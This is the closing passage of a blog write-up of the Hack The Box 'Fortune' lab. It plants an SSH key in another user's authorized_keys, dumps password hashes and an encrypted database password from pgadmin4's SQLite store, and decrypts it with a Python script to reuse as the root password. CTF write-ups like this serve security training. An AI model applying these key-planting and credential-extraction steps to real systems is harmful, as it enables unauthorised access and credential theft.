<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>test1324@ragingunicorn:/mnt/charlie$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABA[...]pgYyFnLt3ysDhscPOtelvd root@ragingunicorn" &gt;&gt; .ssh/authorized_keys
</code></pre></div></div>

<p>Now I can log in as <code class="language-plaintext highlighter-rouge">charlie</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ragingunicorn:~# ssh charlie@fortune.htb
OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.
fortune$
</code></pre></div></div>

<p>In <code class="language-plaintext highlighter-rouge">/var/appsrv/pgadmin4</code>, I find the database for the <code class="language-plaintext highlighter-rouge">pgadmin</code> application: <code class="language-plaintext highlighter-rouge">pgadmin4.db</code></p>

<p>It’s a sqlite database and I already have tools to view this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fortune$ file pgadmin4.db
pgadmin4.db: SQLite 3.x database
</code></pre></div></div>

<p>I find the user authentication table as well as the server table that contains the encrypted <code class="language-plaintext highlighter-rouge">dba</code> account password:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fortune$ sqlite3 pgadmin4.db
SQLite version 3.24.0 2018-06-04 19:24:41
Enter ".help" for usage hints.
sqlite&gt; .tables
alembic_version              roles_users
debugger_function_arguments  server
keys                         servergroup
module_preference            setting
preference_category          user
preferences                  user_preferences
process                      version
role
sqlite&gt; select * from user;
1|charlie@fortune.htb|$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ|1|
2|bob@fortune.htb|$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg|1|

sqlite&gt; select * from server;
1|2|2|fortune|localhost|5432|postgres|dba|utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz||prefer||||||&lt;STORAGE_DIR&gt;/.postgresql/postgresql.crt|&lt;STORAGE_DIR&gt;/.postgresql/postgresql.key|||0||||0||22||0||0|
</code></pre></div></div>

<p>I checked the pgadmin source code on github to understand how it decrypts the <code class="language-plaintext highlighter-rouge">dba</code> password and saw that the <code class="language-plaintext highlighter-rouge">decrypt()</code> function takes two arguments. Since I already have the two values from the database I’ll just copy/paste the code into a new script and punch in the values for bob’s user at the end.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># cat root.py
</span><span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="kn">import</span> <span class="nn">six</span>

<span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers</span> <span class="kn">import</span> <span class="n">Cipher</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers.algorithms</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers.modes</span> <span class="kn">import</span> <span class="n">CFB8</span>

<span class="n">padding_string</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'}'</span>
<span class="n">iv_size</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">block_size</span> <span class="o">//</span> <span class="mi">8</span>

<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="s">"""Add padding to the key."""</span>

    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">six</span><span class="p">.</span><span class="n">text_type</span><span class="p">):</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>

    <span class="c1"># Key must be maximum 32 bytes long, so take first 32 bytes
</span>    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="p">[:</span><span class="mi">32</span><span class="p">]</span>

    <span class="c1"># If key size is 16, 24 or 32 bytes then padding is not required
</span>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">32</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">key</span>

    <span class="c1"># Add padding to make key 32 bytes long
</span>    <span class="k">return</span> <span class="n">key</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="n">padding_string</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="s">"""
    Decrypt the AES encrypted string.
    Parameters:
        ciphertext -- Encrypted string with AES method.
        key        -- key to decrypt the encrypted string.
    """</span>

    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
    <span class="n">iv</span> <span class="o">=</span> <span class="n">ciphertext</span><span class="p">[:</span><span class="n">iv_size</span><span class="p">]</span>

    <span class="n">cipher</span> <span class="o">=</span> <span class="n">Cipher</span><span class="p">(</span><span class="n">AES</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">key</span><span class="p">)),</span> <span class="n">CFB8</span><span class="p">(</span><span class="n">iv</span><span class="p">),</span> <span class="n">default_backend</span><span class="p">())</span>
    <span class="n">decryptor</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="n">decryptor</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">decryptor</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">[</span><span class="n">iv_size</span><span class="p">:])</span> <span class="o">+</span> <span class="n">decryptor</span><span class="p">.</span><span class="n">finalize</span><span class="p">()</span>

<span class="n">res</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="s">"utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz"</span><span class="p">,</span>  <span class="s">"$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
</code></pre></div></div>

<p>Decryption works and I get the <code class="language-plaintext highlighter-rouge">dba</code> password:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ragingunicorn:~/htb/fortune# python root.py
R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
</code></pre></div></div>

<p>Based on the hint I found earlier, I know the <code class="language-plaintext highlighter-rouge">root</code> password is the same one used for <code class="language-plaintext highlighter-rouge">dba</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fortune$ su
Password:

fortune# id
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
fortune# cat /root/root.txt
335af7...
</code></pre></div></div>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#certificate" class="page__taxonomy-item" rel="tag">certificate</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#command-injection" class="page__taxonomy-item" rel="tag">command injection</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#flask" class="page__taxonomy-item" rel="tag">flask</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#nfs" class="page__taxonomy-item" rel="tag">nfs</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#openssl" class="page__taxonomy-item" rel="tag">openssl</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#pgadmin" class="page__taxonomy-item" rel="tag">pgadmin</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#port-forward" class="page__taxonomy-item" rel="tag">port forward</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#postgresql" class="page__taxonomy-item" rel="tag">postgresql</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">python</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#sqlite" class="page__taxonomy-item" rel="tag">sqlite</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#ssh" class="page__taxonomy-item" rel="tag">ssh</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-08-03T00:00:00+02:00">August 03, 2019</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-writeup-lacasa/" class="pagination--pager" title="LaCasaDePapel - Hack The Box
">Previous</a>
    
    
      <a href="/htb-writeup-arkham/" class="pagination--pager" title="Arkham - Hack The Box
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">© 2022 HackCommander</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
